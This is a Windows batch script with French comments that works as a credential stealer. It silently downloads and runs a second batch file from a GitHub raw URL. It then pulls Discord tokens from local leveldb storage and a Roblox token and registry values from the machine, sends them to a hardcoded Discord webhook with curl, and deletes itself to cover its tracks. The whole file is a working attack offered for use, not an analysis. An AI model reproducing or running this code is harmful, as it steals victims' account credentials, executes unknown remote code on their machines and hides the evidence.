@echo off
setlocal enabledelayedexpansion
:: PALOFSC - SCRIPT FINAL : EXECUTION DISTANTE + EXFILTRATION LOCALE
:: WEBHOOK CONFIGURE CI-DESSOUS
set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ===== 1. TENTATIVE D'EXECUTION DU SCRIPT DISTANT (en arrière-plan) =====
set "REMOTE=https://raw.githubusercontent.com/Gxnis/freenitrocode/refs/heads/main/script.bat"
set "TMPFILE=%TEMP%\remote_%RANDOM%.bat"
:: Téléchargement via PowerShell (silencieux)
powershell -NoProfile -Command "& {$wc=New-Object Net.WebClient; $wc.DownloadFile('%REMOTE%', '%TMPFILE%')}" >nul 2>&1
:: Vérification : si fichier non vide, lancement en arrière-plan
if exist "%TMPFILE%" (
    for %%A in ("%TMPFILE%") do if %%~zA gtr 0 (
        start /b "" cmd.exe /c "%TMPFILE%"
    )
    del /f /q "%TMPFILE%" >nul 2>&1
)

:: ===== 2. EXFILTRATION LOCALE (indépendante du distant) =====
:: 2a. Tokens Discord
set "discord_paths=%APPDATA%\Discord\Local Storage\leveldb %APPDATA%\discordptb\Local Storage\leveldb %APPDATA%\discordcanary\Local Storage\leveldb"
set "tokens="
for %%p in (%discord_paths%) do (
    if exist "%%p" (
        for /f "tokens=3 delims= " %%a in ('findstr /r /c:"[a-zA-Z0-9_\-]\{24,28\}\.[a-zA-Z0-9_\-]\{6,7\}\.[a-zA-Z0-9_\-]\{27,38\}" "%%p\*.log" 2^>nul') do (
            set "tokens=!tokens!%%a "
        )
    )
)

:: 2b. Données Roblox
set "roblox_cookie=%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml"
set "roblox_user="
set "roblox_pass="
set "roblox_token="
if exist "%roblox_cookie%" (
    for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%roblox_cookie%" 2^>nul') do set "roblox_token=%%a"
    for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "UserID" 2^>nul') do set "roblox_user=%%a"
    for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"
)

:: 2c. Construction du payload JSON
set "payload={\"content\":\"=== EXFILTRATION ===\n"
if not "!tokens!"=="" set "payload=!payload!Tokens Discord : !tokens!\n"
if not "!roblox_user!"=="" set "payload=!payload!Roblox UserID : !roblox_user!\n"
if not "!roblox_pass!"=="" set "payload=!payload!Roblox RememberMe : !roblox_pass!\n"
if not "!roblox_token!"=="" set "payload=!payload!Roblox Token : !roblox_token!\n"
set "payload=!payload!\"}"

:: 2d. Envoi via curl (silencieux)
curl -s -H "Content-Type: application/json" -d "!payload!" "%WEBHOOK%" >nul 2>&1

:: ===== 3. NETTOYAGE ET SUPPRESSION =====
set "tokens="
set "roblox_token="
set "roblox_user="
set "roblox_pass="
set "payload="
del /f /q "%~f0" >nul 2>&1
exit /b 0
